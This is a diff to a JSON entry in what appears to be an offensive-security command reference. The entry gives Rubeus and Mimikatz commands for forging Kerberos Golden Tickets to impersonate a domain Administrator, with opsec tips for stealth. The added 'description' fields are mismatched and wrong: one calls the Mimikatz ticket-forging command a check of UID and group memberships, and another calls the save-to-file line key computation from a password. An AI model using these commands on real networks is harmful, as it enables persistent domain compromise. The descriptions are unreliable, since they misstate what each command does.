@@ -228,15 +228,18 @@
   "variations": [
     {
       "label": "AES256 (stealthier)",
-      "command": "Rubeus.exe golden /aes256:<krbtgt_aes> /domain:<domain> /sid:<domain_sid> /user:Administrator /ptt"
+      "command": "Rubeus.exe golden /aes256:<krbtgt_aes> /domain:<domain> /sid:<domain_sid> /user:Administrator /ptt",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     },
     {
       "label": "Mimikatz",
-      "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<nt_hash> /ptt"
+      "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<nt_hash> /ptt",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     },
     {
       "label": "Save to file for later",
-      "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /user:Administrator /outfile:golden.kirbi"
+      "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /user:Administrator /outfile:golden.kirbi",
+      "description": "Uses Rubeus to compute Kerberos encryption keys (RC4/AES128/AES256) from a plaintext password. These keys are needed for forging tickets (golden/silver/diamond tickets)."
     }
   ],
   "explain": "Forges a Golden Ticket - a TGT signed with the domain's krbtgt key - for persistent, arbitrary-user domain access:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>           the krbtgt NTLM hash (use /aes256 to be stealthier)\n  /domain:<domain> /sid:<domain_sid>   the domain and its SID\n  /user:Administrator      the identity to impersonate\n  /ptt                      inject the ticket into this session\nSince it is signed with krbtgt, the KDC honors it for any service; access the DC (dir \\\\<dc>\\C$). /ldap /printcmd auto-fills real PAC values for opsec."
